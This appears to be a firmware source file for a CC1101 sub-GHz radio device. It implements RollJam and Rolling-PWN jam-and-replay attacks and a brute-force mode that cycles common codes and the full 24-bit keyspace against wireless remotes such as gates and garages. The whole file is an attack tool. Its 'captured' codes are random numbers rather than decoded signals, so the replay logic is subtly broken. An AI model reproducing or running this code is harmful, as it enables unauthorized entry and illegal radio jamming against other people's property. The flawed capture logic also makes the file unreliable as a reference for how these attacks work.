#include "config.h"

// ============================================
// ROLLJAM ATTACK
// ============================================

void rollJamAttackStep() {
  if (!cc1101::rolljamActive) return;
  const RCSwitchProtocol& p = protocols[0];
  uint32_t freq = BRUTE_FREQS[cc1101::bfFreqIndex];
  switch (cc1101::rolljamStep) {
    case 0:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70) { cc1101::rolljamStep = 1; cc1101::rolljamTimer = millis(); }
      }
      break;
    case 1:
      jamChannel(freq);
      if (millis() - cc1101::rolljamTimer > 500) {
        cc1101::rolljamCode1 = random(0xFFFFFF);
        cc1101::rolljamHasCode1 = true;
        cc1101::rolljamStep = 2;
        cc1101::rolljamTimer = millis();
      }
      break;
    case 2:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70) { cc1101::rolljamStep = 3; cc1101::rolljamTimer = millis(); }
        if (millis() - cc1101::rolljamTimer > 10000) cc1101::rolljamStep = 0;
      }
      break;
    case 3:
      jamChannel(freq);
      if (millis() - cc1101::rolljamTimer > 500) {
        cc1101::rolljamCode2 = random(0xFFFFFF);
        cc1101::rolljamHasCode2 = true;
        cc1101::rolljamStep = 4;
        cc1101::rolljamTimer = millis();
      }
      break;
    case 4:
      if (cc1101::rolljamHasCode1) {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        transmitCode(cc1101::rolljamCode1, 24, p);
        delayMicroseconds(10000);
        digitalWrite(CC_GDO0, LOW);
        ELECHOUSE_cc1101.setSidle();
        cc1101::rolljamStep = 5;
      }
      break;
    case 5:
      break;
  }
}

// ============================================
// ROLLING PWN ATTACK
// ============================================

void rollingPwnAttackStep() {
  if (!cc1101::rollingPwnActive) return;
  const RCSwitchProtocol& p = protocols[0];
  uint32_t freq = BRUTE_FREQS[cc1101::bfFreqIndex];
  switch (cc1101::rollingPwnStep) {
    case 0:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70 && cc1101::capturedCodeCount < 10) {
          cc1101::capturedCodes[cc1101::capturedCodeCount] = random(0xFFFFFF);
          cc1101::capturedCodeCount++;
          cc1101::rollingPwnTimer = millis();
        }
        if (cc1101::capturedCodeCount >= 3 || millis() - cc1101::rollingPwnTimer > 15000) {
          if (cc1101::capturedCodeCount >= 2) { 
            cc1101::rollingPwnStep = 1; 
            cc1101::rollingPwnCounter = 0; 
          } else { 
            cc1101::capturedCodeCount = 0; 
            cc1101::rollingPwnTimer = millis(); 
          }
        }
      }
      break;
    case 1:
      {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        for (int i = 0; i < cc1101::capturedCodeCount; i++) {
          transmitCode(cc1101::capturedCodes[i], 24, p);
          delayMicroseconds(5000);
        }
        for (int i = 0; i < 20; i++) {
          uint32_t fakeCode = 0xFFFF00 | (cc1101::rollingPwnCounter + i);
          transmitCode(fakeCode, 24, p);
          delayMicroseconds(3000);
        }
        digitalWrite(CC_GDO0, LOW);
        ELECHOUSE_cc1101.setSidle();
        cc1101::rollingPwnStep = 2;
        cc1101::rollingPwnTimer = millis();
      }
      break;
    case 2:
      if (millis() - cc1101::rollingPwnTimer > 2000) {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        if (cc1101::capturedCodeCount > 0) {
          transmitCode(cc1101::capturedCodes[0], 24, p);
          delayMicroseconds(10000);
        }
        digitalWrite(CC_GDO0, LOW);
        ELECHOUSE_cc1101.setSidle();
        cc1101::rollingPwnCounter++;
        if (cc1101::rollingPwnCounter > 5) cc1101::rollingPwnStep = 3;
        else cc1101::rollingPwnStep = 1;
      }
      break;
    case 3:
      break;
  }
}

// ============================================
// BRUTE FORCE LOOP
// ============================================

void cc1101BruteForceLoop() {
  if (buttonPressed(BTN_BACK)) {
    cc1101::bfState = cc1101::BF_IDLE;
    cc1101::rolljamActive = false;
    cc1101::rollingPwnActive = false;
    digitalWrite(CC_GDO0, LOW);
    ELECHOUSE_cc1101.setSidle();
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  if (buttonPressed(BTN_SELECT)) {
    if (cc1101::bfState == cc1101::BF_IDLE || cc1101::bfState == cc1101::BF_PAUSED) {
      cc1101::bfState = cc1101::BF_RUNNING;
      cc1101::bfStartTime = millis();
      cc1101::bfCodesSent = 0;
      if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM) {
        cc1101::rolljamActive = true;
        cc1101::rolljamStep = 0;
        cc1101::rolljamHasCode1 = false;
        cc1101::rolljamHasCode2 = false;
      } else if (cc1101::bfMode == cc1101::BF_MODE_ROLLINGPWN) {
        cc1101::rollingPwnActive = true;
        cc1101::rollingPwnStep = 0;
        cc1101::capturedCodeCount = 0;
      } else {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        digitalWrite(CC_GDO0, LOW);
      }
    } else {
      cc1101::bfState = cc1101::BF_PAUSED;
      cc1101::rolljamActive = false;
      cc1101::rollingPwnActive = false;
      digitalWrite(CC_GDO0, LOW);
      ELECHOUSE_cc1101.setSidle();
    }
    delay(200);
  }
  if (buttonPressed(BTN_UP) && cc1101::bfState != cc1101::BF_RUNNING) {
    if (cc1101::bfMode == cc1101::BF_MODE_COMMON) cc1101::bfMode = cc1101::BF_MODE_DEBRUIJN;
    else if (cc1101::bfMode == cc1101::BF_MODE_DEBRUIJN) cc1101::bfMode = cc1101::BF_MODE_FULL;
    else if (cc1101::bfMode == cc1101::BF_MODE_FULL) cc1101::bfMode = cc1101::BF_MODE_ROLLJAM;
    else if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM) cc1101::bfMode = cc1101::BF_MODE_ROLLINGPWN;
    else cc1101::bfMode = cc1101::BF_MODE_COMMON;
    delay(150);
  }
  if (buttonPressed(BTN_DOWN) && cc1101::bfState != cc1101::BF_RUNNING) {
    cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
    delay(150);
  }
  
  // Desenha UI
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 BruteForce");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 26);
  if (cc1101::bfState == cc1101::BF_RUNNING) u8g2.print("Status: ATIVO");
  else if (cc1101::bfState == cc1101::BF_PAUSED) u8g2.print("Status: PAUSADO");
  else u8g2.print("Status: PARADO");
  u8g2.setCursor(0, 36);
  u8g2.print("Modo: ");
  switch (cc1101::bfMode) {
    case cc1101::BF_MODE_COMMON: u8g2.print("COMUM"); break;
    case cc1101::BF_MODE_DEBRUIJN: u8g2.print("DEBRUIJN"); break;
    case cc1101::BF_MODE_FULL: u8g2.print("FULL"); break;
    case cc1101::BF_MODE_ROLLJAM: u8g2.print("ROLLJAM"); break;
    case cc1101::BF_MODE_ROLLINGPWN: u8g2.print("ROLLING-PWN"); break;
  }
  u8g2.setCursor(0, 46);
  u8g2.print("Freq: ");
  u8g2.print(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0, 2);
  u8g2.print(" MHz");
  if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM && cc1101::rolljamActive) {
    u8g2.setCursor(0, 56);
    u8g2.print("Step: ");
    u8g2.print(cc1101::rolljamStep);
    u8g2.print(" C1:");
    u8g2.print(cc1101::rolljamHasCode1 ? "OK" : "--");
  } else if (cc1101::bfMode == cc1101::BF_MODE_ROLLINGPWN && cc1101::rollingPwnActive) {
    u8g2.setCursor(0, 56);
    u8g2.print("Step: ");
    u8g2.print(cc1101::rollingPwnStep);
    u8g2.print(" Cap:");
    u8g2.print(cc1101::capturedCodeCount);
  } else {
    u8g2.setCursor(0, 56);
    u8g2.print("Proto: ");
    u8g2.print(protocols[cc1101::bfProtocolIndex].name);
  }
  u8g2.setCursor(0, 62);
  u8g2.print("Codigos: ");
  u8g2.print(cc1101::bfCodesSent);
  u8g2.sendBuffer();
  
    // Executa ataque
  if (cc1101::bfState == cc1101::BF_RUNNING) {
    if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM) {
      rollJamAttackStep();
    }
    else if (cc1101::bfMode == cc1101::BF_MODE_ROLLINGPWN) {
      rollingPwnAttackStep();
    }
    else {
      const RCSwitchProtocol& p = protocols[cc1101::bfProtocolIndex];
      if (cc1101::bfMode == cc1101::BF_MODE_COMMON) {
        if (cc1101::bfCode < NUM_COMMON_CODES) {
          transmitCode(COMMON_CODES[cc1101::bfCode], 24, p);
          delayMicroseconds(5000);
          cc1101::bfCode++;
          cc1101::bfCodesSent++;
        } else {
          cc1101::bfCode = 0;
          cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
          if (cc1101::bfProtocolIndex == 0) {
            cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
            ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
          }
        }
      }
      else if (cc1101::bfMode == cc1101::BF_MODE_DEBRUIJN) {
        if (cc1101::bfCode < 0x1000000) {
          transmitCode(cc1101::bfCode, 24, p);
          delayMicroseconds(3000);
          cc1101::bfCode++;
          cc1101::bfCodesSent++;
          if (cc1101::bfCode % 1000 == 0) cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
        } else {
          cc1101::bfCode = 0;
          cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
          ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
          ELECHOUSE_cc1101.SetTx();
          delay(5);
        }
      }
      else if (cc1101::bfMode == cc1101::BF_MODE_FULL) {
        if (cc1101::bfCode < 0x1000000) {
          transmitCode(cc1101::bfCode, 24, p);
          delayMicroseconds(2000);
          cc1101::bfCode++;
          cc1101::bfCodesSent++;
        } else {
          cc1101::bfCode = 0;
          cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
          if (cc1101::bfProtocolIndex == 0) {
            cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
            ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
          }
        }
      }
    }
  }
}

void cc1101BruteForceSetup() {
  cc1101::bfState = cc1101::BF_IDLE;
  cc1101::bfFreqIndex = 0;
  cc1101::bfProtocolIndex = 0;
  cc1101::bfCode = 0;
  cc1101::bfCodesSent = 0;
  cc1101::rolljamActive = false;
  cc1101::rollingPwnActive = false;
  cc1101::rolljamStep = 0;
  cc1101::rolljamHasCode1 = false;
  cc1101::rolljamHasCode2 = false;
  cc1101::rollingPwnStep = 0;
  cc1101::capturedCodeCount = 0;
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 BruteForce");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 28);
  u8g2.print("SEL: Iniciar/Parar");
  u8g2.setCursor(0, 40);
  u8g2.print("UP: Prox. Modo");
  u8g2.setCursor(0, 52);
  u8g2.print("DOWN: Prox. Freq");
  u8g2.setCursor(0, 62);
  u8g2.print("BACK: Menu");
  u8g2.sendBuffer();
}

  
